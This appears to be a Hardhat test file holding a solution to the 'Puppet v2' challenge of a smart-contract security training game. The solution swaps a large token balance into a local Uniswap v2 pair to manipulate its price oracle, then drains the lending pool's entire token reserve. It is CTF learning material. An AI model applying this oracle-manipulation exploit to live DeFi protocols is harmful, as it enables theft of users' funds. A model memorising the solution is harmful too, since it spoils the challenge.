const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

async function allBalances(who, token, weth, address) {
    let tokenBalance = await token.balanceOf(address);
    let wethBalance = await weth.balanceOf(address);
    let ethBalance = await ethers.provider.getBalance(address);
    console.log(`${who} token balance: ${tokenBalance.toString().padStart(25)}`);
    console.log(`${who} WETH  balance: ${wethBalance.toString().padStart(25)}`);
    console.log(`${who} ETH   balance: ${ethBalance.toString().padStart(25)}`);
    console.log();
}

async function getAmountsOut(router, tokenIn, tokenOut, amount) {
    const path = [tokenIn.address, tokenOut.address];
    const amountsOut = await router.getAmountsOut(amount, path);
    console.log(`Amounts Out: ${amountsOut[0].toString().padStart(25)}:${amountsOut[1].toString().padStart(25)}`);

    // The last element of amountsOut array represents the amount of output token
    return amountsOut[amountsOut.length - 1];
}

async function getAmountsIn(router, tokenIn, tokenOut, amount) {
    const path = [tokenIn.address, tokenOut.address];
    const amountsIn = await router.getAmountsIn(amount, path);
    console.log(`Amounts In:  ${amountsIn[0].toString().padStart(25)}:${amountsIn[1].toString().padStart(25)}`);

    return amountsIn[0];
}

async function calculateDepositOfWETHRequired(router, exchange, token, tokenDelta, weth, wethDelta, amount) {
    let tokenBalance = await token.balanceOf(exchange.address);
    let wethBalance = await weth.balanceOf(exchange.address);

    tokenBalance = BigInt(tokenBalance.toString()) + tokenDelta;
    wethBalance = BigInt(wethBalance.toString()) + wethDelta;

    let quote = await router.quote(amount, tokenBalance, wethBalance);
    quote = BigInt(quote.toString()) * 3n;

    console.log(`Pool     tokens:        ${amount.toString().padStart(25)}`);
    console.log(`Pool     ETH price:     ${quote.toString().padStart(25)}`);
    console.log();

    return quote;
}

async function getBlockDeadline() {
    const deadline = 600;

    const blockNumber = await ethers.provider.getBlockNumber();
    if (!blockNumber && blockNumber !== 0) {
        throw new Error("invalid block number");
    }

    const block = await ethers.provider.getBlock(blockNumber);
    if (!block) {
        throw new Error("invalid block");
    }

    return block.timestamp + deadline;
}

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Info', async function () {
        let price = await lendingPool.calculateDepositOfWETHRequired(10n ** 18n);
        console.log(`Pool     tokens:        ${(10n ** 18n).toString().padStart(25)}`);
        console.log(`Pool     ETH price:     ${price.toString().padStart(25)}`);
        console.log();

        console.log("Confirming:");
        await calculateDepositOfWETHRequired(uniswapRouter, uniswapExchange, token, 0n, weth, 0n, 10n ** 18n);

        await allBalances("player  ", token, weth, player.address);
        await allBalances("exchange", token, weth, uniswapExchange.address);
        await allBalances("pool    ", token, weth, lendingPool.address);

        console.log("token -> weth");
        await getAmountsOut(uniswapRouter, token, weth, 10n ** 18n);
        await getAmountsIn(uniswapRouter, token, weth, 10n ** 18n);
        console.log();

        console.log("weth -> token");
        await getAmountsOut(uniswapRouter, weth, token, 10n ** 18n);
        await getAmountsIn(uniswapRouter, weth, token, 10n ** 18n);
        console.log();

        console.log();
        console.log("=============================================");
        console.log("token -> weth");
        let ethReceived = await getAmountsOut(uniswapRouter, token, weth, PLAYER_INITIAL_TOKEN_BALANCE);
        await calculateDepositOfWETHRequired(
            uniswapRouter,
            uniswapExchange,
            token, PLAYER_INITIAL_TOKEN_BALANCE,
            weth, -1n * BigInt(ethReceived.toString()), POOL_INITIAL_TOKEN_BALANCE);

        console.log("weth -> token");
        let tokenReceived = await getAmountsOut(uniswapRouter, weth, token, PLAYER_INITIAL_ETH_BALANCE);
        await calculateDepositOfWETHRequired(
            uniswapRouter,
            uniswapExchange,
            token, -1n * BigInt(tokenReceived.toString()),
            weth, PLAYER_INITIAL_ETH_BALANCE, POOL_INITIAL_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log();
        console.log("=============================================");
        console.log("token -> weth");
        console.log("Approving token transfer...");
        let tx = await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await tx.wait();

        console.log("Swapping tokens for weth...");
        const ethReceived = await getAmountsOut(uniswapRouter, token, weth, PLAYER_INITIAL_TOKEN_BALANCE);
        const deadline = await getBlockDeadline();
        tx = await uniswapRouter.connect(player).swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            BigInt(ethReceived.toString()),
            [token.address, weth.address],
            player.address,
            deadline, { gasLimit: 1e6 });
        await tx.wait();
        console.log();

        await allBalances("player  ", token, weth, player.address);
        await allBalances("exchange", token, weth, uniswapExchange.address);
        await allBalances("pool    ", token, weth, lendingPool.address);

        let price = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(`Pool     tokens:        ${(POOL_INITIAL_TOKEN_BALANCE).toString().padStart(25)}`);
        console.log(`Pool     ETH price:     ${price.toString().padStart(25)}`);
        console.log();

        console.log("Converting ETH for WETH...");
        tx = await weth.connect(player).deposit({ value: 196n * 10n ** 17n });
        await tx.wait();
        await allBalances("player  ", token, weth, player.address);

        console.log("Approving weth transfer...");
        tx = await weth.connect(player).approve(lendingPool.address, price);
        await tx.wait();

        console.log("Withdrawing tokens from pool...");
        tx = await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
        await tx.wait();
        console.log();

        await allBalances("player  ", token, weth, player.address);
        await allBalances("exchange", token, weth, uniswapExchange.address);
        await allBalances("pool    ", token, weth, lendingPool.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});
